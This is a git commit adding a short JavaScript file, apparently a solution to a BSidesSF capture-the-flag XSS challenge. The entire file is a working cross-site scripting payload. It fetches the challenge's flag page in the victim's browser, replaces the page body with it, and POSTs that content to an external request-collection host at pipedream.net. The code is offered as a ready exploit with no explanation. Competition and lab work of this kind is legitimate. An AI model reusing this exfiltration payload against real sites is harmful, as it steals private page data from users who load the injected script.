be05f91eceae3c2400e15c42af29188c43866326
tanuarta <84058742+tanuarta@users.noreply.github.com>
2022-06-04 11:47:20 +1000

    Create bsides.js

---
+++ bsides.js
@@ -0,0 +1,18 @@
+async function load_home(_callback) {
+  let url = 'https://web-tutorial-1-a1ef0161.challenges.bsidessf.net/xss-two-flag';
+
+  document.body.innerHTML = await (await fetch(url)).text();
+  _callback();
+}
+
+function exploit() {
+  load_home(function () {
+    var body = document.body.innerHTML;
+    fetch('https://eny56ahhsgh5.x.pipedream.net', {
+      method: 'POST',
+      body: body
+    })
+  });
+}
+
+exploit();
